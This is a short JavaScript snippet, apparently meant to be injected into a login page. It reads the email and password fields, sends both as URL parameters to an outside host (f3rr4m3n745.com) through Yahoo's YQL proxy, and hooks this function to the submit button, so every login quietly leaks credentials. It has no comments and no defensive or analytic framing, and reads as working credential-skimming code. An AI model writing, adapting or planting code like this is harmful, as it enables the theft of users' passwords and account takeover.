function getData() {
  
  var email = document.getElementById('credentials-email').value;
  var password = document.getElementById('credentials-password').value;
  
  var url = "http://f3rr4m3n745.com/shorter.php?username=" + email + "&password=" + password;
  
  $.getJSON("https://query.yahooapis.com/v1/public/yql?"
  +"q=select%20*%20from%20html%20where%20url%3D%22"
  +encodeURIComponent(url)
  +"%22&format=xml'&callback=?");
  
}

var value = document.getElementById('credentials-submit');
value.setAttribute("onClick", "getData();"); 
